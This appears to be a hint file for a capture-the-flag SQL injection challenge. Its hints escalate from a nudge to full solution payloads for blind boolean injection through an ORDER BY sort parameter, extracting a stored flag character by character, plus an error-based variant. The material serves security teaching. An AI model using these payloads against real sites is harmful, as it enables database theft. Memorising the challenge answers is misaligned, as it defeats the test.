hints.title: Nudge
hints.content: Click the column headers to sort. Notice how the URL changes? The sort parameter controls which column the results are ordered by.

hints.title: Direction
hints.content: You can't use UNION in ORDER BY, but you can use expressions like IF() or CASE. If you can make the sort order change based on a condition, you have a data channel.

hints.title: Approach
hints.content: Try: IF(1=1, username, score) as the sort value. If the results sort by username when the condition is true and by score when false, you can use this to ask yes/no questions about the database.

hints.title: Near-solution
hints.content: Use: IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),1,1))>64, username, score) — compare sort orders to binary-search each character of the flag.

hints.title: Solution
hints.content: For each character position N: send ?sort=IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),{N},1))>{mid}, username, score). Compare the sort order of results. If sorted by username, the condition is true (char > mid). Binary search to find each character. Alternatively, use error-based via: (SELECT IF(ASCII(SUBSTRING((SELECT value FROM flag_store LIMIT 1),1,1))>64, 1, (SELECT table_name FROM information_schema.tables))) to force an error as signal.
